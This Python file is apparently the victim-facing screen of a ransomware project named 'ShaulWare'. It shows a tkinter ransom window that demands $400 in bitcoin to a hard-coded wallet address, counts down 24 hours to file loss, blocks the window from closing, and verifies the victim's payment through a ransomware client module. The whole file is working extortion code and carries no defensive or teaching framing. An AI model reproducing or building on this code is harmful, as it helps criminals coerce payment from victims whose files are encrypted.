import tkinter as tk
from timer import Timer
from tkinter import filedialog, Text
from coinbase.wallet.client import Client
import os
from datetime import datetime, timedelta
from ransomware_client import RansomwareClient

root = tk.Tk()
root.title('ShaulWare Decrypt')
root.resizable(False, False)
canvas = tk.Canvas(root, height=800, width=1250, bg="#841212")
canvas.pack()
client = RansomwareClient()

canDecrypt = False
text_list = []


def disable_event():
    global canDecrypt
    if canDecrypt:
        root.destroy()


def decryption_start():
    global canDecrypt
    global canvas
    if canDecrypt:
        canvas['background'] = '#558c0d'
        canvas.delete('all')
        clock.destroy()
        canvas.create_image(125, 140, image=green_lock)
        for textbox in text_list:
            textbox.destroy()


# "b605656f-5bad-51ec-b200-c368aeac3fbe"


def check_payment():
    global canDecrypt
    global client
    transaction_id = client_transaction_id.get("1.0", tk.END+"-1c")
    canDecrypt = client.check_payment(transaction_id)
    decryption_start()


def copy_address():
    r = tk.Tk()
    r.withdraw()
    r.clipboard_clear()
    r.clipboard_append("37fRiWcuXADrjukfXu2eaQ5k4RP99sp4Bv")
    r.destroy()

# --------- TEXT ------------
# WHERE TO PUT THE VICTIM'S TRANSACTION ID:


transaction_id_writing = tk.Label(root, text="Transaction id here:", height=2)
transaction_id_writing.place(x=430, y=760)
text_list.append(transaction_id_writing)

# BITCOIN WALLET
my_wallet_id = tk.Label(root, text="BITCOIN ADDRESS: 37fRiWcuXADrjukfXu2eaQ5k4RP99sp4Bv", height=2)
my_wallet_id.place(x=835, y=570)
text_list.append(my_wallet_id)

# VICTIM'S TRANSACTION ID
client_transaction_id = Text(root, height=2, width=40)
client_transaction_id.place(x=550, y=760)
text_list.append(client_transaction_id)

# LOST FILES
currentTimeDate = datetime.now() + timedelta(days=1)
currentTime = currentTimeDate.strftime('%Y-%m-%d %H:%M')
lost_files = tk.Label(root, text=f"Your files will be lost on \n{currentTime}\n\n Time Left:", fg='yellow', bg='#841212'
                      , font=("Arial", 15))
lost_files.place(x=20, y=280)
text_list.append(lost_files)

# INFO BOX

with open(r'ransomnote.txt', 'r') as file:
    ransomnote = file.read()
info = tk.Label(root, text=ransomnote, bg='white', fg='black', height=30, width=78, justify='left', anchor='nw',
                font=("Arial", 12))
info.place(x=540, y=10)
text_list.append(info)

# SEND MONEY
send_money = tk.Label(root, text="-------->\nSend 400$\n worth of bitcoin\n to this address", height=11, width=15,
                      anchor='n')
send_money.place(x=720, y=570)
text_list.append(send_money)
# --------- BUTTONS ------------
# A BUTTON TO CHECK PAYMENT
CheckPayment = tk.Button(root, text="Check Payment", fg="black", bg="white", padx=130, pady=5, command=check_payment)
CheckPayment.place(x=900, y=760)
text_list.append(CheckPayment)

# A BUTTON TO COPY THE ADDRESS TO CLIPBOARD
CopyAddress = tk.Button(root, text="Copy", fg="black", bg="white", padx=25, pady=5, command=copy_address)
CopyAddress.place(x=1160, y=570)
text_list.append(CopyAddress)


# --------- IMAGES ------------
# BITCOIN ACCEPTED HERE SIGN
bitcoin_accepted_here = tk.PhotoImage(file="bitcoin.png")
canvas.create_image(1040, 680, image=bitcoin_accepted_here)

# QR CODE
qr_code = tk.PhotoImage(file="QR.PNG")
canvas.create_image(627, 660, image=qr_code)

# RED LOCK

red_lock = tk.PhotoImage(file="red.png")
canvas.create_image(125, 140, image=red_lock)

# GREEN LOCK
green_lock = tk.PhotoImage(file="green.png")

# YOK
yok = tk.PhotoImage(file="yok.png")
canvas.create_image(400, 180, image=yok)

# YOK2
yok2 = tk.PhotoImage(file="yok2.png")
canvas.create_image(400, 540, image=yok2)

# --------- LABELS ------------
clock = tk.Label(root, height=1, background="#000000", foreground='white', font=("Lemon Milk", 20), text="00:00:00")
timer = Timer(root=root, hours=23, minutes=59, seconds=59, clock=clock)
z = timer.start_clock()
print(z)
root.protocol("WM_DELETE_WINDOW", disable_event)
root.mainloop()
